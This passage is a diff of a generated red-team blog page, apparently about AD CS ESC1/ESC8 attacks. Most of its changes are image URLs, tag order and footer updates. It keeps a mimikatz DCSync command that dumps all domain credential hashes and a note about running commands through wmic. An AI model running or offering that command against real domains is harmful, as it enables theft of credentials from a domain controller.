 lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200719283.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200719283.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">wmic执行命令即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816201949460.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816201949460.png"></p>
 
                 
             </div>
@@ -759,12 +749,16 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Domain-environment/">
-                                    <span class="chip bg-color">Domain environment</span>
-                                </a>
-                            
                                 <a href="/tags/Redteam/">
                                     <span class="chip bg-color">Redteam</span>
+                                </a>
+                            
+                                <a href="/tags/Domain-Environment/">
+                                    <span class="chip bg-color">Domain Environment</span>
+                                </a>
+                            
+                                <a href="/tags/PTT/">
+                                    <span class="chip bg-color">PTT</span>
                                 </a>
                             
                                 <a href="/tags/DPE/">
@@ -781,10 +775,6 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                             
                                 <a href="/tags/ESC8/">
                                     <span class="chip bg-color">ESC8</span>
-                                </a>
-                            
-                                <a href="/tags/PTT/">
-                                    <span class="chip bg-color">PTT</span>
                                 </a>
                             
                         </div>
@@ -837,7 +827,7 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                 <a href="/2021/08/16/sqlserver-focus-command/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812233018443.png" class="responsive-img" alt="Sqlserver focus command">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812233018443.png" class="responsive-img" alt="Sqlserver focus command">
                         
                         <span class="card-title">Sqlserver focus command</span>
                     </div>
@@ -856,8 +846,8 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Miscellaneous-record/" class="post-category">
-                                    Miscellaneous record
+                            <a href="/categories/Tips/" class="post-category">
+                                    Tips
                                 </a>
                             
                             
@@ -871,6 +861,10 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
+                    <a href="/tags/Command-execution/">
+                        <span class="chip bg-color">Command execution</span>
+                    </a>
+                    
                     <a href="/tags/Information-collection/">
                         <span class="chip bg-color">Information collection</span>
                     </a>
@@ -881,10 +875,6 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                     
                     <a href="/tags/Database/">
                         <span class="chip bg-color">Database</span>
-                    </a>
-                    
-                    <a href="/tags/Command-execution/">
-                        <span class="chip bg-color">Command execution</span>
                     </a>
                     
                 </div>
@@ -901,7 +891,7 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                 <a href="/2021/08/11/powershell-bypass-tips/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151247591.png" class="responsive-img" alt="Powershell bypass tips">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151247591.png" class="responsive-img" alt="Powershell bypass tips">
                         
                         <span class="card-title">Powershell bypass tips</span>
                     </div>
@@ -935,12 +925,12 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/RCE/">
-                        <span class="chip bg-color">RCE</span>
-                    </a>
-                    
                     <a href="/tags/Bypass/">
                         <span class="chip bg-color">Bypass</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
                     </a>
                     
                     <a href="/tags/Powershell/">
@@ -1179,7 +1169,7 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2021</span>
+                <span id="year">2021-2022</span>
             
             <span id="year">2021</span>
             <a href="/about" target="_blank">Yangsir</a>
@@ -1188,7 +1178,7 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">13.8k</span>&nbsp;字
+                class="white-color">62.8k</span>&nbsp;字
             
             
             
